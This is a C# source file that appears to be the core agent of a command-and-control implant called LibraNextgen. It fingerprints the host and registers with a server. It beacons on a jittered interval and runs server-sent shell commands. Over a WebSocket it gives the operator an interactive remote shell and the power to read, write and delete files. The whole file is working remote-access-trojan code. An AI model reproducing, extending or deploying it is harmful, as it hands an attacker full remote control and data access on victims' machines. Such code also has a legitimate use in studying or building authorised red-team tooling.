using System.Diagnostics;
using System.Text.Json;
using LibraNextgen.Agent.Communication;
using LibraNextgen.Agent.Crypto;
using LibraNextgen.Agent.Modules.Execution;
using LibraNextgen.Agent.Platform;
using LibraNextgen.Common.Protocol;

namespace LibraNextgen.Agent.Core;

public class AgentEngine
{
    private readonly ConfigManager _config;
    private readonly AgentCrypto _crypto;
    private readonly IPlatformExecutor _executor;
    private ICommunicator _http = null!;
    private WsCommunicator? _ws;
    private string _agentId = string.Empty;
    private string _hostname = string.Empty;
    private CancellationTokenSource? _cts;
    private InteractiveShellHandle? _shell;

    public AgentEngine(ConfigManager config, AgentCrypto crypto)
    {
        _config = config;
        _crypto = crypto;
        _executor = OperatingSystem.IsWindows()
            ? new WindowsExecutor()
            : new LinuxExecutor();
    }

    public async Task RunAsync(CancellationToken cancellationToken = default)
    {
        _cts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        _crypto.GenerateKeyPair();

        _hostname = Environment.MachineName;
        var userName = Environment.UserName;
        var osVersion = Environment.OSVersion.VersionString;
        var arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";

        Console.WriteLine("[Agent] Collecting hardware info...");
        var hardware = HardwareCollector.Collect();
        hardware.Hwid = HardwareCollector.ComputeHwid(hardware);
        Console.WriteLine($"[Agent] HWID: {hardware.Hwid}");
        var hardwareJson = HardwareCollector.Serialize(hardware);

        _http = new HttpCommunicator(_config);

        Console.WriteLine($"[Agent] Starting on {_hostname}...");

        _agentId = await _http.RegisterAsync(
            _hostname, userName, osVersion, arch, _crypto.RsaPublicKey ?? "", hardwareJson, _cts.Token);

        if (string.IsNullOrEmpty(_agentId))
        {
            Console.WriteLine("[Agent] Registration failed. Exiting.");
            return;
        }

        Console.WriteLine($"[Agent] Registered as {_agentId}");

        // Connect WebSocket for real-time shell + file operations
        try
        {
            _ws = new WsCommunicator(_config.ServerUrl, _agentId);
            await _ws.ConnectAsync(_cts.Token);
            Console.WriteLine("[Agent] WebSocket connected.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Agent] WS connect failed: {ex.Message}. Falling back to HTTP-only.");
            _ws = null;
        }

        // Run heartbeat + WS receive loop in parallel
        if (_ws != null)
        {
            var heartbeatTask = HeartbeatLoopAsync(_cts.Token);
            var wsTask = WsReceiveLoopAsync(_cts.Token);
            await Task.WhenAny(heartbeatTask, wsTask);
        }
        else
        {
            await HeartbeatLoopAsync(_cts.Token);
        }
    }

    private async Task HeartbeatLoopAsync(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var interval = _config.GetJitteredInterval();
                await Task.Delay(interval, ct);

                var task = await _http.HeartbeatAsync(_agentId, ct);
                if (task != null)
                {
                    Console.WriteLine($"[Agent] Received task: {task.CommandType} - {task.Command}");
                    await ExecuteTaskAsync(task, ct);
                }
            }
            catch (TaskCanceledException) { break; }
            catch (Exception ex)
            {
                Console.WriteLine($"[Agent] Heartbeat error: {ex.Message}");
            }
        }
    }

    private async Task WsReceiveLoopAsync(CancellationToken ct)
    {
        if (_ws == null) return;

        while (!ct.IsCancellationRequested && _ws.IsConnected)
        {
            try
            {
                var msg = await _ws.ReceiveAsync(ct);
                if (msg == null) break;

                await HandleWsMessage(msg, ct);
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex)
            {
                Console.WriteLine($"[Agent] WS error: {ex.Message}");
            }
        }

        // WS disconnected — clean up shell
        KillShell();
    }

    private async Task HandleWsMessage(WebSocketMessage msg, CancellationToken ct)
    {
        if (_ws == null) return;

        switch (msg.Type)
        {
            case "shell.bind":
                StartShell();
                break;

            case "shell.unbind":
                KillShell();
                break;

            case "shell.input":
                HandleShellInput(msg);
                break;

            case "file.drives":
                await HandleFileDrives(msg, ct);
                break;

            case "file.list":
                await HandleFileList(msg, ct);
                break;

            case "file.read":
                await HandleFileRead(msg, ct);
                break;

            case "file.write":
                await HandleFileWrite(msg, ct);
                break;

            case "file.delete":
                await HandleFileDelete(msg, ct);
                break;

            case "file.mkdir":
                await HandleFileMkdir(msg, ct);
                break;
        }
    }

    // ── Shell ──────────────────────────────────────────────────────────────

    private void StartShell()
    {
        KillShell();

        try
        {
            var handle = _executor.StartInteractiveShell();
            _shell = handle;
            var proc = handle.Process;
            var ct = handle.Cts.Token;

            // Read stdout in background
            _ = Task.Run(async () =>
            {
                var buf = new char[1024];
                try
                {
                    while (!ct.IsCancellationRequested && !proc.HasExited)
                    {
                        var n = await proc.StandardOutput.ReadAsync(buf, 0, buf.Length);
                        if (n > 0)
                        {
                            var text = new string(buf, 0, n);
                            await SendShellOutput(text);
                        }
                    }
                }
                catch (OperationCanceledException) { }
                catch (Exception ex)
                {
                    await SendShellOutput($"\r\n[Shell read error: {ex.Message}]\r\n");
                }
            }, ct);

            // Read stderr in background
            _ = Task.Run(async () =>
            {
                var buf = new char[1024];
                try
                {
                    while (!ct.IsCancellationRequested && !proc.HasExited)
                    {
                        var n = await proc.StandardError.ReadAsync(buf, 0, buf.Length);
                        if (n > 0)
                        {
                            var text = new string(buf, 0, n);
                            await SendShellOutput(text);
                        }
                    }
                }
                catch (OperationCanceledException) { }
                catch { /* ignore */ }
            }, ct);

            // Detect process exit
            _ = Task.Run(async () =>
            {
                try
                {
                    await proc.WaitForExitAsync(ct);
                    if (!ct.IsCancellationRequested)
                    {
                        await SendShellOutput("\r\n[Shell process exited]\r\n");
                    }
                }
                catch { /* ignore */ }
            }, ct);
        }
        catch (Exception ex)
        {
            _ = SendShellOutput($"\r\n[Failed to start shell: {ex.Message}]\r\n");
        }
    }

    private void HandleShellInput(WebSocketMessage msg)
    {
        if (_shell?.Process is { HasExited: false } proc)
        {
            var text = msg.Data?.GetProperty("text").GetString() ?? "";
            proc.StandardInput.Write(text);
            proc.StandardInput.Flush();
        }
    }

    private void KillShell()
    {
        try
        {
            _shell?.Cts.Cancel();
            if (_shell?.Process is { HasExited: false } proc)
            {
                proc.Kill(true);
                proc.Dispose();
            }
        }
        catch { /* ignore */ }
        _shell = null;
    }

    private async Task SendShellOutput(string text)
    {
        if (_ws == null || !_ws.IsConnected) return;

        try
        {
            await _ws.SendResultAsync("shell.output", _agentId, new { text });
        }
        catch { /* ignore */ }
    }

    // ── File operations ──────────────────────────────────────────────────

    private async Task HandleFileDrives(WebSocketMessage msg, CancellationToken ct)
    {
        var drives = _executor.GetDrives();
        if (_ws != null)
            await _ws.SendResultAsync("file.drives.result", _agentId, new { drives }, msg.RequestId);
    }

    private async Task HandleFileList(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "C:\\";
        var result = FileOps.ListDirectory(path);
        if (_ws != null)
            await _ws.SendResultAsync("file.list.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
    }

    private async Task HandleFileRead(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var result = FileOps.ReadFile(path);
        if (_ws != null)
            await _ws.SendResultAsync("file.read.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
    }

    private async Task HandleFileWrite(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var content = msg.Data?.GetProperty("content").GetString() ?? "";
        var result = FileOps.WriteFile(path, content);
        if (_ws != null)
            await _ws.SendResultAsync("file.write.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
    }

    private async Task HandleFileDelete(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var result = FileOps.DeleteFile(path);
        if (_ws != null)
            await _ws.SendResultAsync("file.delete.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
    }

    private async Task HandleFileMkdir(WebSocketMessage msg, CancellationToken ct)
    {
        var path = msg.Data?.GetProperty("path").GetString() ?? "";
        var result = FileOps.CreateDirectory(path);
        if (_ws != null)
            await _ws.SendResultAsync("file.mkdir.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
    }

    // ── HTTP Task execution (heartbeat) ──────────────────────────────────

    private async Task ExecuteTaskAsync(LibraNextgen.Common.Models.AgentTask task, CancellationToken ct)
    {
        var output = "";
        var error = "";
        var success = false;

        try
        {
            switch (task.CommandType)
            {
                case Common.Models.CommandType.Shell:
                    output = await _executor.ExecuteAsync(task.Command, ct);
                    success = true;
                    break;
                case Common.Models.CommandType.FileList:
                    output = FileOps.ListDirectory(task.Command);
                    success = true;
                    break;
                case Common.Models.CommandType.FileDrives:
                    output = JsonSerializer.Serialize(_executor.GetDrives());
                    success = true;
                    break;
                case Common.Models.CommandType.Sleep:
                    if (int.TryParse(task.Command, out var seconds))
                    {
                        await Task.Delay(seconds * 1000, ct);
                        output = $"Slept for {seconds}s";
                        success = true;
                    }
                    break;
                default:
                    output = $"Unknown command type: {task.CommandType}";
                    break;
            }
        }
        catch (Exception ex)
        {
            error = ex.Message;
        }

        var escapedOutput = JsonEscape(output);
        var escapedError = JsonEscape(error);
        var resultJson = $"{{\"taskId\":\"{task.Id}\",\"success\":{success.ToString().ToLowerInvariant()},\"output\":\"{escapedOutput}\",\"error\":\"{escapedError}\"}}";
        await _http.SubmitResultAsync(_agentId, resultJson, ct);
    }

    private static string JsonEscape(string s)
    {
        var sb = new System.Text.StringBuilder(s.Length);
        foreach (var c in s)
        {
            switch (c)
            {
                case '\\': sb.Append("\\\\"); break;
                case '"': sb.Append("\\\""); break;
                case '\n': sb.Append("\\n"); break;
                case '\r': sb.Append("\\r"); break;
                case '\t': sb.Append("\\t"); break;
                case '\b': sb.Append("\\b"); break;
                case '\f': sb.Append("\\f"); break;
                default: sb.Append(c); break;
            }
        }
        return sb.ToString();
    }
}
